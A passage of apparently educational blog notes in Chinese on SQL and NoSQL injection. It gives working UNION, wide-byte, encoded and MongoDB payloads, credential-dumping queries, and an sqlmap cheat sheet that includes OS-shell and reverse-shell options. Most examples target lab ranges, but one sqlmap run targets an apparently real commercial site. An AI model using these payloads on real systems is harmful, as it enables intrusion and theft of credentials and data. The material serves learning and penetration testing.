        <content type="html"><![CDATA[<h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><p>SQL根据接收数据方式的不同，可以分为数字型注入、字符型注入、搜索型注入、编码型注入，不同的注入方式涉及的注入语句虽然区别不大，但是如果不加以区分，就会导致手注失败，甚至可能会判定为没有注入点，我们拿到一个站点的第一步就是应该先测出属于哪种类型的注入，下面我们介绍一下注入类型</p><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>数字型就是我们前几次介绍的最多的，也是我们比较常见的注入类型之一，为什么叫数字型，是因为我们传进去的参数后端会把其当作数字，其注入语句如下</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from guestbook where id = $i&quot;;</span><br></pre></td></tr></table></figure><p>即我们不需要单引号也能正常运行，所以对于数字型注入点，我们不需要加引号，不用考虑符号的闭合</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132658943-1178045758.png" alt="1645148271844-90d3415a-9f2b-4692-b736-e45fd574f523.png"></p><p>假设我们传进去的注入语句为<code>1 order by 2</code>，传入sql就会变为<code>$sql = &quot;select * from guestbook where id = 1 order by 2&quot;;</code>，即我们不需要加任何符号进行闭合，也不需要在尾部增加注释符就可以完成注入</p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>字符型遇到的也比较多，sql语句如下所示</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from guestbook where id = &#x27;$i&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>当然，值得注意的是，字符型的注入既可以是单引号也可以用双引号，我们这里使用单引号进行演示</p><p>仍然假定我们的注入语句为<code>1 order by 2</code>，我们替换<code>$i</code>，看看会出现什么</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from guestbook where id = &#x27;1 order by 2&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>我们可以发现我们的注入语句被当作了字符串进行处理，此时就会报错，我们正常的做法应该是闭合前面一个单引号，注释掉后面的单引号，所以注入语句应该是<code>1&#39; order by 2 #</code>或者<code>1&#39; order by 2 --+</code>，我们的组合注入语句就会变成：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from guestbook where id = &#x27;1&#x27; order by 2 #&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>这个时候我们可以发现此时的注入语句可以正常实现</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132700572-576098440.png" alt="1645150888578-5aefbe4f-2c4e-4ae3-b10b-77360ab6b9f6.png"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8081</span><span class="operator">/</span>web<span class="operator">/</span>news.php?gtpl<span class="operator">=</span>simple<span class="string">&#x27; UNION ALL SELECT 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132701959-851248856.png" alt="1645151176379-19129378-b6d3-4a98-8a55-bb88b1cb8923.png"></p><h3 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h3><p>搜索型的主要特征就是具有通配符<code>%%</code>，因为有通配符的存在，所以我们需要闭合通配符和单引号，其实原理和字符型差不多，重在理解</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from guestbook where gName like &#x27;%$s%&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>所以我们的注入语句如下所示</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8081</span><span class="operator">/</span>web<span class="operator">/</span>news.php?<span class="keyword">search</span><span class="operator">=</span>演示<span class="operator">%</span><span class="string">&#x27; UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 --+</span></span><br></pre></td></tr></table></figure><p>这个时候我们带入后端sql语句，就会是下面的样子</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from guestbook where gName like &#x27;%演示%&#x27; UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+%&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>这样看似好像已经没有任何问题了，但是实际结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132702118-489985223.png" alt="1645151528559-766a6dbd-07aa-4d97-b0fd-bcff00f8317e.png"></p><p>后面实际上是闭合不了的，真实的sql语句应该是这样的</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span>语句：http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8081</span><span class="operator">/</span>web<span class="operator">/</span>news.php?<span class="keyword">search</span><span class="operator">=</span>演示<span class="operator">%</span><span class="string">&#x27; UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">代入：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> guestbook <span class="keyword">where</span> gName <span class="keyword">like</span> <span class="string">&#x27;%演示%&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">and</span> <span class="string">&#x27;%&#x27;</span><span class="operator">=</span><span class="string">&#x27;%&#x27;</span></span><br></pre></td></tr></table></figure><p>这样我们就可以正确运行了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132701292-1678954771.png" alt="1645151747640-f62b1f39-f474-4358-8a90-4ed9cfc01865.png"></p><h3 id="编码型"><a href="#编码型" class="headerlink" title="编码型"></a>编码型</h3><p>顾名思义，就是对传入的sql语句进行编码后再进行传入后端，后端再进行解码后查询数据库，对应的后端代码如下所示</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$b<span class="operator">=</span>base64_decode($_GET[<span class="string">&#x27;base&#x27;</span>]);     </span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from guestbook where id=$b&quot;;</span><br></pre></td></tr></table></figure><p>因此，面对这种的解决方案也很简单，就是直接将注入语句进行相应的编码后再进行注入即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132702807-187043495.png" alt="1645152782742-f0034b99-5dad-4d83-b17b-3cd8b25e925a.png"></p><p>JSON格式</p><p>JSON就是将数据以键名和键值的方式进行传输，提交的数据其实是一样的</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>值得注意的是，json数据格式并不会将双引号传递进去，而是将双引号的内容取出来进行传入，所以我们并不需要闭合这个双引号，所以我们只需要忽略这个双引号构造注入语句即可</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">json=<span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&#x27; order by 3#&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132701371-960386351.png" alt="1645154839886-b16bf86b-aff4-4bab-b285-68fcc7511c23.png"></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>如果一个字符的大小是一个字节，这种字节称为窄字节；如果一个字符的大小是两个字节的话，就是宽字节</p><ul><li>像GB2312、GBK、GB18030、BIG5等等这些编码都是常说的宽字节，也就是只有两个字节</li><li>英文默认占一个字节，中文占两个字节</li></ul><p>为了防止网站被SQL注入，一些网站开发人员会做一些防护措施，其中最常见的就是对一些特殊字符进行转义，即用<code>\</code>来进行转义，通过前面的文章可以了解到，sql注入的关键一步就是让引号闭合和跳出引号，如果无法跳出引号，那么你输入的内容就会永远的在引号里，那么你的输入内容永远会被当作字符串进行处理，所以我们应该怎么解决呢？</p><p>办法就是让转义符号<code>\</code>失去转义的作用，我们可以使用宽字节来使转义符失效，我们常见的宽字节符号为<code>%df</code>，由于<code>\</code>的编码是<code>%5c</code>，这两个组合在一起就变成了<code>%df%5c</code>，组成了一个新的字符，这个字符是一个汉字，这个时候我们引号的意义就存在了</p><p>我们以sqli-lab上的例题33为例，进行相关演示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240713152924817.png" alt="image-20240713152924817"></p><p>我们可以很清楚的知道这是一个宽字节注入问题，我们添加<code>%df</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240713153028163.png" alt="image-20240713153028163"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240713153134392.png" alt="image-20240713153134392"></p><p>很好，宽字节起作用了，而且明显是一个单引号的字符型注入，然后接下来按照正常的步骤一直注入就行了，其他的就不再演示了</p><h2 id="sqlmap之tamper使用"><a href="#sqlmap之tamper使用" class="headerlink" title="sqlmap之tamper使用"></a>sqlmap之tamper使用</h2><p>对于编码注入的网站，如果直接拿去sqlmap跑，会出现找不到注入点的情况，比如执行<code>python310 sqlmap.py -u &quot;http://knotsolutions.com/case_study_view.php?id=&quot;</code>，会出现下面的情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132702770-127180557.png" alt="1645160779571-f8f6e869-a303-4672-9057-df6e7fe13266.png"></p><p>这个时候就需要用到tamper脚本，附加上base64encode.py脚本，这个脚本是sqlmap自带的，当然我们也可以将自己编写的脚本放在这个目录下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240713142215768.png" alt="image-20240713142215768"></p><p>我们执行<code>python310 sqlmap.py -u &quot;http://knotsolutions.com/case_study_view.php?id=&quot; --tamper=base64encode.py</code>，命令，就可以找到注入点，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132703278-1912680499.png" alt="1645160919520-470d0d25-7b5c-4a6b-b362-75783d4c483e.png"></p><p>我们使用相关脚本来实现宽字节注入，如下所示</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://<span class="number">38</span>.<span class="number">147</span>.<span class="number">173</span>.<span class="number">118</span>:<span class="number">81</span>/Less-<span class="number">33</span>/?id=<span class="number">1</span>&quot; --tamper=unmagicquotes.py</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240713153945501.png" alt="image-20240713153945501"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240713154033218.png" alt="image-20240713154033218"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240713154828207.png" alt="image-20240713154828207"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> SQL注入 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
            <tag> 编码注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-SQL注入（三）</title>
      <link href="/post/a2ca5b96.html"/>
      <url>/post/a2ca5b96.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章将简单介绍Oracle数据库和Mongodb数据库的手工注入语法，帮助大家更好的理解SQL注入背后的原理，然后再介绍sqlmap的一些基础用法，帮助大家快速掌握sqlmap进行注入的语法，以及sqlmap和msf联动，体验如何通过注入漏洞进行<code>getshell</code></p><h2 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><p>Oracle数据库主要和JAVA应用联合使用，也是较为常见的数据库之一，所以我们很有必要了解Oracle数据库的手工注入流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 定字段</span><br><span class="line">and 1=2 union select null,null..... from dual 然后一个一个去判断字段类型，方法如下</span><br><span class="line">and 1=2 union select &#x27;null&#x27;,null...... from dual 返回正常，说明第一个字段是字符型，反之为数字型</span><br><span class="line">第一个字段是字符型，判断第二个字段类型：</span><br><span class="line">and 1=2 union select &#x27;null&#x27;,&#x27;null&#x27;...... from dual 返回正常，说明第二个字段是字符型，反之为数字型</span><br><span class="line">第一个字段是数字型，判断第二个字段类型：</span><br><span class="line">and 1=2 union select null,&#x27;null&#x27;...... from dual 返回正常，说明第二个字段是字符型，反之为数字型</span><br><span class="line">判断第n个字段的类型，依次类推即可</span><br><span class="line"></span><br><span class="line">确定回显位，假设当前共2个字段，全是数字型，判断方式如下：</span><br><span class="line">and 1=2 union select 1,2 from dual</span><br><span class="line">假设回显位是2，爆当前数据库中的第一个表：</span><br><span class="line">and 1=2 union select 1,(select table_name from user_tables where rownum=1) from dual</span><br><span class="line">爆当前数据库中的第二个表：</span><br><span class="line">and 1=2 union select 1,(select table_name from user_tables where rownum=1 and table_name not in (&#x27;第一个表&#x27;)) from dual</span><br><span class="line">以此类推去爆第n个表</span><br><span class="line"></span><br><span class="line">爆某表中的第一个字段：</span><br><span class="line">and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&#x27;表名（大写的）&#x27;) from dual</span><br><span class="line">爆某表中的第二个字段：</span><br><span class="line">and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&#x27;表名&#x27; and column_name not in (&#x27;第一个字段&#x27;)) from dual</span><br><span class="line">爆其它字段以此类推</span><br><span class="line"></span><br><span class="line">爆某表中的第一行数据：</span><br><span class="line">and 1=2 union select 1,字段1||字段2...||字段n from 表名 where rownum=1 --连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串</span><br></pre></td></tr></table></figure><p>为什么每一个都有dual？是因为oracle自带虚拟表dual，所以每一个都是from dual进行查询</p><p>参考文章：<a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p><p>以墨者靶场为例子，我们来进行手工注入</p><p>首先测字段<code>order by 2</code>，此时页面正常，当<code>order by 3</code>时页面返回异常，说明此时字段数为2</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132513431-1649636380.png" alt="1645010034505-e06d1599-1756-4b36-87ac-e1665941a2d6.png"></p><p>我们可以测出是字符型注入，我们爆他的显位，<code>union select &#39;1&#39;,&#39;2&#39; from dual</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132511105-823880858.png" alt="1645010209892-b0d6fa48-801f-430c-a220-5409ec6c15de.png"></p><p>然后我们开始爆表名，我们有两种方法，我们可以一个个查，也可以进行模糊查询，一个个查的话如果表的个数太多，就会很繁琐</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1) from dual</span><br><span class="line">and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1 and table_name not in (&#x27;LOGMNR_SESSION_EVOLVE$&#x27;)) from dual</span><br><span class="line">以此类推</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132510726-1471088798.png" alt="1645010360304-b207f79c-c209-453c-9f10-c6e2f6fb99fd.png"></p><p>模糊查询的条件就是你要提前知道你要查什么表，不过一般都是查user这种用户信息表，所以我们可以进行如下构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1 and table_name like &#x27;%user%&#x27;) from dual</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132510915-1113336943.png" alt="1645010789400-52b5c94a-3532-4244-b63a-0ca6db5aac20.png"></p><p>我们这样就可以查到我们想要的表名，这样可以极大的减少我们的工作量，然后再从表中获取列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select &#x27;1&#x27;,(select column_name from all_tab_columns where rownum=1 and table_name=&#x27;sns_users&#x27;) from dual</span><br><span class="line">其他数据：and 1=2 union select &#x27;1&#x27;,(select column_name from all_tab_columns where rownum=1 and table_name=&#x27;sns_users&#x27; and column_name not in (&#x27;USER_NAME&#x27;)) from dual</span><br><span class="line">以此类推</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132511114-103955937.png" alt="1645010896358-07ce89a7-e3a1-4c10-922b-8f0f931a7ae0.png"></p><p>紧接着就是爆相关数据了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select user_name,user_pwd from &quot;sns_users&quot;</span><br><span class="line">爆其他数据：and 1=2 union select user_name,user_pwd from &quot;sns_users&quot; where USER_NAME&lt;&gt;&#x27;hu&#x27;</span><br><span class="line">以此类推</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132604297-358155965.png" alt="1645011155061-54ea3ada-0ced-45da-9d81-48c234884dab.png"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132608468-81621309.png" alt="1645011108123-6be876d8-28c3-4f21-b210-889bac805687.png"></p><p>至此，一个完整的Oracle注入流程到此结束</p><h2 id="Mongodb数据库"><a href="#Mongodb数据库" class="headerlink" title="Mongodb数据库"></a>Mongodb数据库</h2><p>Mongodb数据库在python中应用比较多，和其他数据库不同的是，Mongodb很少有sql注入漏洞，他的未授权访问漏洞比较多，因为Mongodb没有源码的话很难进行注入，因为他的传参语句和别人不太一样，例如以下这个墨者靶场里的一个Mongodb数据库的注入，就给出了部分源代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132521287-379411331.png" alt="1645011642696-733404a2-dfda-480d-87b7-30aeea5461ad.png"></p><p>他的传参语句就是<code>var data = db.notice.findOne(&#123;&#39;id&#39;:&#39;$id&#39;&#125;);return data;</code>，如果没有关键代码，我们很难想到用<code>&#39;&#125;);</code>去闭合语句，进而造成注入</p><p>相关参考文章：<a href="https://www.runoob.com/mongodb/mongodb-query.html">https://www.runoob.com/mongodb/mongodb-query.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们首先来分析一下如何注入</span><br><span class="line">mdb数据库语法：select * from news where id = &#123;(&#x27;$id&#x27;)&#125;</span><br><span class="line">原始语句：db.notice.findOne(&#123;&#x27;id&#x27;:&#x27;$id&#x27;&#125;);return data;</span><br><span class="line">如果我们的注入语句为 ?id=1 order by 2</span><br><span class="line">那么就会成为 db.notice.findOne(&#123;&#x27;id&#x27;:&#x27;1 order by 2&#x27;&#125;);return data; 会被当成字符串处理，而不会造成注入语句的发生</span><br><span class="line">当注入语句为 ?id =1&#x27;&#125;); return (&#123;title:1,content:&#x27;2</span><br><span class="line">就会成为 db.notice.findOne(&#123;&#x27;id&#x27;:&#x27;1&#x27;&#125;); return (&#123;title:1,content:&#x27;2&#x27;&#125;);return data; 进而成功造成注入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基本注入语句：</span><br><span class="line">测回显：/new_list.php?id=1&#x27;&#125;); return (&#123;title:1,content:&#x27;2</span><br><span class="line">爆库： /new_list.php?id=1&#x27;&#125;); return (&#123;title:tojson(db),content:&#x27;1</span><br><span class="line">爆表： /new_list.php?id=1&#x27;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#x27;1</span><br><span class="line">爆字段：/new_list.php?id=1&#x27;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#x27;1</span><br></pre></td></tr></table></figure><p>下面继续测回显<code>?id =1&#39;&#125;); return (&#123;title:1,content:&#39;2</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132511662-766688999.png" alt="1645012603798-16fa1dce-66cb-4081-94d1-5e38379cd3e5.png"></p><p>然后进行爆库<code>?id=1&#39;&#125;); return (&#123;title:tojson(db),content:&#39;1</code>，这里为什么要使用<code>tojson</code>函数，是因为mdb返回的数据是json格式的，所以我们先要进行数据格式的转换，这个可以在mdb官方文档中可以查到</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240711170050564.png" alt="image-20240711170050564"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132511880-1624057672.png" alt="1645012647787-2354cc19-fe88-4aea-9bde-d0866bcc7023.png"></p><p>然后进行爆表<code>?id=1&#39;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#39;1</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132514213-2138427310.png" alt="1645012716133-830d0f7c-4b49-41f9-9904-3f1216639ba7.png"></p><p>最后进行爆字段<code>?id=1&#39;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1</code>，其中，db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据，然后递增数字进行查询每一条记录即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132514717-445053814.png" alt="1645012843215-556e310f-922c-4526-8437-5c275faa0d0a.png"></p><p>至此，Mongodb注入到此结束</p><h2 id="SQLMAP入门教程"><a href="#SQLMAP入门教程" class="headerlink" title="SQLMAP入门教程"></a>SQLMAP入门教程</h2><p>SQLMAP是一项强大的sql注入自动化工具，我们可以通过特定的命令来实现对几乎所有的数据库类型进行注入，提高我们的注入效率，当然，sqlmap也不支持一些非常少见的数据库，比如nosql，下面就是sqlmap的使用教程</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">SQLmap使用步骤：</span><br><span class="line">1、判断数据库注入点</span><br><span class="line">2、判断注入点权限</span><br><span class="line">  </span><br><span class="line"><span class="section">#SQLMAP使用参数：</span></span><br><span class="line">参考：https://www.cnblogs.com/bmjoker/p/9326258.html</span><br><span class="line">基本操作笔记：-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6) </span><br><span class="line"><span class="code">    0：只显示Python的回溯，错误和关键消息。 </span></span><br><span class="line"><span class="code">    1：显示信息和警告消息。 </span></span><br><span class="line"><span class="code">    2：显示调试消息。 </span></span><br><span class="line"><span class="code">    3：有效载荷注入。 </span></span><br><span class="line"><span class="code">    4：显示HTTP请求。 </span></span><br><span class="line"><span class="code">    5：显示HTTP响应头。 </span></span><br><span class="line"><span class="code">    6：显示HTTP响应页面的内容 </span></span><br><span class="line"><span class="code">--privileges  #查看权限 </span></span><br><span class="line"><span class="code">--is-dba      #是否是数据库管理员 </span></span><br><span class="line"><span class="code">--roles       #枚举数据库用户角色 </span></span><br><span class="line"><span class="code">--udf-inject  #导入用户自定义函数（获取系统权限） </span></span><br><span class="line"><span class="code">--union-check  #是否支持union 注入 </span></span><br><span class="line"><span class="code">--union-cols #union 查询表记录 </span></span><br><span class="line"><span class="code">--union-test #union 语句测试 </span></span><br><span class="line"><span class="code">--union-use  #采用union 注入 </span></span><br><span class="line"><span class="code">--union-tech orderby #union配合order by </span></span><br><span class="line"><span class="code">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span></span><br><span class="line"><span class="code">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span></span><br><span class="line"><span class="code">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span></span><br><span class="line"><span class="code">--user-agent &quot;&quot;  #自定义user-agent </span></span><br><span class="line"><span class="code">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span></span><br><span class="line"><span class="code">--string=&quot;&quot;    #指定关键词,字符串匹配. </span></span><br><span class="line"><span class="code">--threads 　　  #采用多线程(--threads 3) </span></span><br><span class="line"><span class="code">--sql-shell    #执行指定sql命令 </span></span><br><span class="line"><span class="code">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span></span><br><span class="line"><span class="code">--file-read    #读取指定文件 </span></span><br><span class="line"><span class="code">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span></span><br><span class="line"><span class="code">--file-dest    #要写入的文件绝对路径 </span></span><br><span class="line"><span class="code">--os-cmd=id    #执行系统命令 </span></span><br><span class="line"><span class="code">--os-shell     #系统交互shell </span></span><br><span class="line"><span class="code">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span></span><br><span class="line"><span class="code">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span></span><br><span class="line"><span class="code">--os-smbrelay  # </span></span><br><span class="line"><span class="code">--os-bof       # </span></span><br><span class="line"><span class="code">--reg-read     #读取win系统注册表 </span></span><br><span class="line"><span class="code">--priv-esc     # </span></span><br><span class="line"><span class="code">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 </span></span><br><span class="line"><span class="code">-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span></span><br><span class="line"><span class="code">--eta          #盲注 </span></span><br><span class="line"><span class="code">/pentest/database/sqlmap/txt/</span></span><br><span class="line"><span class="code">common-columns.txt　　字段字典　　　 </span></span><br><span class="line"><span class="code">common-outputs.txt </span></span><br><span class="line"><span class="code">common-tables.txt      表字典 </span></span><br><span class="line"><span class="code">keywords.txt </span></span><br><span class="line"><span class="code">oracle-default-passwords.txt </span></span><br><span class="line"><span class="code">user-agents.txt </span></span><br><span class="line"><span class="code">wordlist.txt </span></span><br><span class="line"><span class="code"> </span></span><br><span class="line"><span class="code"> </span></span><br><span class="line"><span class="code">常用语句 :</span></span><br><span class="line"><span class="code">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span></span><br><span class="line"><span class="code">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span></span><br><span class="line"><span class="code">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span></span><br><span class="line"><span class="code">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span></span><br><span class="line"><span class="code">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span></span><br><span class="line"><span class="code">6./sqlmap.py -u 